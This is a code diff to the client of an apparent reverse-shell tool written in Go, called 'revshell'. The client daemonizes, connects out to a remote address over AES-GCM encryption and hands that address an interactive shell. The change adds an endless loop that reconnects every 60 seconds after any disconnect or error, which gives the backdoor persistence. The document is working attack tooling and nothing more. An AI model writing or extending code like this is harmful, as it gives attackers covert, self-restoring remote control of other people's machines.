@@ -8,6 +8,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"time"
 
 	"revshell/pkg/secureio"
 	"revshell/pkg/terminal"
@@ -29,15 +30,34 @@ func main() {
 		log.Fatalf("client: failed to daemonize: %v", err)
 	}
 
+	const reconnectDelay = 60 * time.Second
+
+	for {
+		if err := runClient(opts); err != nil {
+			if errors.Is(err, io.EOF) {
+				log.Printf("client: connection closed, reconnecting")
+			} else {
+				log.Printf("client: session ended with error: %v", err)
+			}
+		} else {
+			log.Printf("client: session ended, reconnecting")
+		}
+
+		log.Printf("client: waiting %s before retrying", reconnectDelay)
+		time.Sleep(reconnectDelay)
+	}
+}
+
+func runClient(opts clientOptions) error {
 	conn, err := net.Dial("tcp", opts.addr)
 	if err != nil {
-		log.Fatalf("client: failed to connect to %s: %v", opts.addr, err)
+		return fmt.Errorf("failed to connect to %s: %w", opts.addr, err)
 	}
 	defer conn.Close()
 
 	transport, err := secureio.Handshake(conn, false, opts.aesKey, opts.authPassword)
 	if err != nil {
-		log.Fatalf("client: handshake failed: %v", err)
+		return fmt.Errorf("handshake failed: %w", err)
 	}
 
 	log.Printf("client: connected to %s with AES-GCM encryption", opts.addr)
@@ -45,16 +65,14 @@ func main() {
 	sessionOpts := terminal.Options{Prompt: opts.prompt, Shell: opts.shell, InitialDir: opts.workdir}
 	session, err := terminal.NewSession(transport.Reader(), transport.Writer(), sessionOpts)
 	if err != nil {
-		log.Fatalf("client: failed to create session: %v", err)
+		return fmt.Errorf("failed to create session: %w", err)
 	}
 
 	if resizeEvents := transport.ResizeEvents(); resizeEvents != nil {
 		session.SetResizeEvents(resizeEvents)
 	}
 
-	if err := session.Run(); err != nil && !errors.Is(err, io.EOF) {
-		log.Printf("client: session ended with error: %v", err)
-	}
+	return session.Run()
 }
 
 func parseFlags() clientOptions {
